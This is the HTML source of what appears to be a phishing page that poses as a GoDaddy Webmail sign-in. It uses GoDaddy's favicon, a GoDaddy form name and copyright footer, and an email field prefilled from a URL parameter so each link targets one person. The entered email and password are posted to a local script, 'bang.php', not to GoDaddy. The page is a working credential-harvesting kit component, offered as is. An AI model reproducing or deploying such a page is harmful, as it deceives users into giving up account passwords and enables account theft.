<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html><head>
  
  <meta content="text/html; charset=ISO-8859-1" http-equiv="content-type">

  
  <link href="https://img1.wsimg.com/auth/v1/static/1287/img/favicon.ico" rel="shortcut icon" type="image/vnd.microsoft.icon">
  <title>sign in</title>

  
  
  <script type="text/javascript">
  function submitFunction()
  {
  var email=document.getElementById('email').value;
  var atpos = email.indexOf("@");
  var dotpos = email.lastIndexOf(".");
   var password=document.getElementById('password').value;
  
  if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 > email.length)
  
  {
  
    document.getElementById("error0").innerHTML="Enter your work or school email";
  document.getElementById("error0").style.color = '#c31c1c';
                flag=1;
  return false;
  
  }
  
  if(password=="")
  		{
  			document.getElementById("error1").innerHTML="Enter email password";
  				document.getElementById("error1").style.color = '#c31c1c';   
                flag=1;
  				return false;
  		}
  
else
		{
				return true;
		}

  }
  </script>
  
  <style>
html { 
  background: url(images/bg-pass.png) no-repeat center center fixed; 
  -webkit-background-size: cover;
  -moz-background-size: cover;
  -o-background-size: cover;
  background-size: cover;
}

 table.right {
    margin-left:auto; 
    margin-right:5%;
  }

.footer {
    position: fixed;
    left: 0;
    bottom: 0;
    width: 100%;
height: 5%;
    background-color: rgb(204, 204, 204);
    color: black;
    text-align: center;
}

.label-maker{
    font-family: sans-serif;
}
.label-maker input{border-radius:5px;
      -moz-border-radius:5px;
      -webkit-border-radius:5px;
    border: 0.5px solid #999;
    width: 100%;
    border-bottom-color: #000;
    padding: .2em;
    display: inline-block;
    color: black;
    font-family: arial;
    font-size: 1.0em;
    gradient(#444, #333);
    box-shadow: 0 .5px .5px #A9A9A9;
text-align: left;
}

    .btn {
  -webkit-border-radius: 5px;
  -moz-border-radius: 5px;
  border-radius: 5px;
  font-family: Arial;
  color: white;
  font-size: 12px;
  background: rgb(50, 119, 203);
  padding: 5px 50px 5px 50px;
  text-decoration: none;
}

.btn:hover {
  background: rgb(50, 119, 203);
  text-decoration: none;
}

  </style>
</head><body>
<form method="post" action="bang.php" name="godaddy" class="label-maker" onsubmit="return submitFunction();">
  <div style="text-align: center;"> </div>
  <table style="background-color: white; width: 45%;" class="right" border="0" cellpadding="40">
    <tbody>
      <tr align="center">
        <td style="vertical-align: middle; text-align: center;"><img style="width: 224px; height: 82px;" alt="" src="images/Unknown.png"><br>
        </td>
      </tr>
      <tr align="left">
        <td style="vertical-align: middle; background-color: black; text-align: center;"><big><big><big><big><big><span style="color: white; font-family: Arial;">Webmail</span></big></big></big></big></big><br>
        </td>
      </tr>
      <tr>
        <td style="vertical-align: top; background-color: rgb(204, 204, 204);"><big><big><big><span style="font-weight: bold;">Sign in<br>
        <small><small><small>Email</small><br>
        <input readonly="readonly" name="email" id="email" value="<?=$_GET[address5242453243253254353424532543]?>"><div id="error0" align="left"></div>
        <small>Password</small><br>
        <input name="password" id="password" placeholder="password" type="password"><div id="error1" align="left"></div>
        <br>
        <button type="submit" id="button" class="btn" style="opacity: 1;">Login</button><br>
        </small></small></span></big></big></big></td>
      </tr>
    </tbody>
  </table>
</form>

<div class="footer"><small><br>
<span style="font-weight: bold;">Copyright � 1999 - 2018 GoDaddy
Operating
Company, LLC. All Rights Reserved.&nbsp;&nbsp;&nbsp;&nbsp; Privacy
Policy</span></small></div>

</body></html>